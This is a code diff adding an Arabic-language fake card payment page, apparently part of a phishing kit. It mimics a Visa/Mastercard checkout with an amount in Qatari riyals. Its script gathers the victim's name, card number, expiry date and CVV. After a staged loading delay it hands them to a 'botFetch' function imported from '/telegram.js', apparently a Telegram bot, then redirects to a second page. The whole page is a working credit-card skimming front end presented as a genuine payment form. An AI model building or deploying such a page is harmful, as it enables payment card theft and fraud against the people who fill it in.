@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="en">
+
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>فشل الدفع</title>
+        <link rel="preconnect" href="https://fonts.googleapis.com" />
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+        <link
+            href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap"
+            rel="stylesheet" />
+        <style>
+        * {
+            box-sizing: border-box;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Cairo", sans-serif;
+            background: #f5f6f8;
+            direction: rtl;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 40px;
+        }
+
+        .card {
+            background: #fff;
+            width: 340px;
+            height: fit-content;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
+        }
+
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            margin-bottom: 20px;
+        }
+
+        .header .logos {
+            display: flex;
+            justify-content: center;
+            gap: 5px;
+        }
+
+        .header .logos img {
+            width: 40px;
+        }
+
+        .header span {
+            font-weight: bold;
+            color: #333;
+        }
+
+        .amount {
+            font-size: 24px;
+            font-weight: bold;
+            margin-bottom: 15px;
+            color: #222;
+            text-align: center;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 6px;
+            color: #333;
+        }
+
+        input,
+        select {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 6px;
+        }
+
+        input:focus,
+        select:focus {
+            border-color: #4caf50;
+            outline: none;
+        }
+
+        .row {
+            display: flex;
+            gap: 10px;
+        }
+
+        .row select {
+            flex: 1;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 12px;
+            background: #0a8a2a;
+            color: #fff;
+            border: none;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 16px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .btn.loading {
+            background: #06771f;
+            cursor: not-allowed;
+        }
+
+        .btn img {
+            width: 18px;
+            height: 18px;
+        }
+
+        .btn:hover {
+            background: #06771f;
+        }
+
+        .error {
+            color: red;
+            font-size: 13px;
+            margin-bottom: 10px;
+        }
+    </style>
+    </head>
+
+    <body>
+        <div class="card">
+            <div class="header">
+                <span>Credit / Debit Card</span>
+                <div class="logos">
+                    <img id="visaLogo"
+                        src="https://upload.wikimedia.org/wikipedia/commons/4/41/Visa_Logo.png"
+                        alt="Visa" />
+                    <img id="mcLogo"
+                        src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png"
+                        alt="MasterCard" />
+                </div>
+
+            </div>
+            <div class="amount">QAR +<span id="amountDisplay"></span>
+            </div>
+
+            <form id="paymentForm">
+                <label>الاسم</label>
+                <input type="text" id="name" required />
+
+                <label>رقم البطاقة</label>
+                <input type="text" id="card" maxlength="16" required />
+
+                <label>تاريخ الانتهاء</label>
+                <div class="row">
+                    <select id="month" required>
+                        <option value>الشهر</option>
+                        <option value="01">01</option>
+                        <option value="02">02</option>
+                        <option value="03">03</option>
+                        <option value="04">04</option>
+                        <option value="05">05</option>
+                        <option value="06">06</option>
+                        <option value="07">07</option>
+                        <option value="08">08</option>
+                        <option value="09">09</option>
+                        <option value="10">10</option>
+                        <option value="11">11</option>
+                        <option value="12">12</option>
+                    </select>
+                    <select id="year" required>
+                        <option value>السنة</option>
+                        <option>2025</option>
+                        <option>2026</option>
+                        <option>2027</option>
+                        <option>2028</option>
+                        <option>2029</option>
+                        <option>2030</option>
+                        <option>2031</option>
+                        <option>2032</option>
+                        <option>2033</option>
+                        <option>2034</option>
+                        <option>2035</option>
+                    </select>
+                </div>
+
+                <label>CVV</label>
+                <input type="password" id="cvv" maxlength="3" required />
+
+                <div id="error" class="error"></div>
+                <button type="submit" class="btn" id="payBtn">
+                    Pay
+                </button>
+
+            </form>
+        </div>
+
+        <script type="module">
+        import botFetch from "/telegram.js";
+
+        // change the value from queryparameters 
+        const params = new URLSearchParams(window.location.search);
+        const amount = params.get("amount") || "1110";
+
+        document.getElementById("amountDisplay").textContent = amount;
+
+        document.getElementById("paymentForm").addEventListener("submit", function (e) {
+            e.preventDefault();
+
+            let name = document.getElementById("name").value.trim();
+            let card = document.getElementById("card").value.trim();
+            let month = document.getElementById("month").value;
+            let year = document.getElementById("year").value;
+            let cvv = document.getElementById("cvv").value.trim();
+            let error = document.getElementById("error");
+            let payBtn = document.getElementById("payBtn");
+
+            error.textContent = "";
+
+            if (name === "" || card === "" || month === "" || year === "" || cvv === "") {
+                error.textContent = "يرجى ملء جميع الحقول";
+                return;
+            }
+
+            if (!/^\d{16}$/.test(card)) {
+                error.textContent = "رقم البطاقة يجب أن يحتوي على 16 رقمًا";
+                return;
+            }
+
+            if (!/^\d{3}$/.test(cvv)) {
+                error.textContent = "CVV يجب أن يحتوي على 3 أرقام";
+                return;
+            }
+
+            const userData = { name, card, amount, month, year, cvv };
+            sessionStorage.setItem("userData", JSON.stringify(userData));
+
+            payBtn.innerHTML = `<img src="https://i.gifer.com/ZZ5H.gif" alt="loading" /> جاري التحميل...`;
+            payBtn.classList.add("loading");
+            payBtn.disabled = true;
+
+            setTimeout(() => {
+                botFetch(userData, "/page2.html");
+            }, 5000);
+
+        });
+
+
+    </script>
+    </body>
+
+</html>
